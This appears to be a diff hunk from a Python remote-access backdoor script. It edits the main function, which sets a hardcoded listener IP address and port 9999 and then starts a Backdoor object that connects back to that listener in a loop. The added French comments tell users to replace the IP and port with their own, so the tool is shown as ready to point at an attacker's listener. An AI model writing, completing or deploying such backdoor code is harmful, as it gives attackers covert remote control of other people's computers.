@@ -161,8 +161,8 @@ class Backdoor:
 
 
 def main():
-    listenerIP = "77.202.221.174"
-    listenerPort = 9999
+    listenerIP = "77.202.221.174" # a changer par votre ip
+    listenerPort = 9999 # a changer par votre port
     backdoor = Backdoor(listenerIP, listenerPort)
     while True:
         try:
